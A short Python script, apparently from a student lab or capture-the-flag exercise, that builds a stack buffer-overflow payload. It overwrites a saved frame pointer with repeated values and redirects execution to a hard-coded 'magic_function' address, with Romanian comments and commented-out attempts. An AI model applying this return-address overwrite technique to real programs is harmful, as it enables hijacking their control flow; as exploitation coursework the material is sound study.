buffer_size = 34
value = 0x42
fini = 0x08049395
address_magic_function = 0x080494a2


# Create payload
payload = value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
for i in range(33):
    payload += value.to_bytes(4, 'little')
# payload = b'A' * buffer_size  # Fill the buffer
# Doar cu astea merge
# payload = value.to_bytes(4, 'little')
# for i in range(73):
    # payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += b'A' * 12 # dc sunt 3 bytes intre ei? Alta intrebare!
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += value.to_bytes(4, 'little')  # Value to be written in saved frame pointer
# payload += fini.to_bytes(4, 'little')  # Address of magic_function
payload += address_magic_function.to_bytes(4, 'little')  # Address of magic_function



# Write length of payload and payload to a file
with open('payload.bin', 'wb') as f:
    f.write(payload)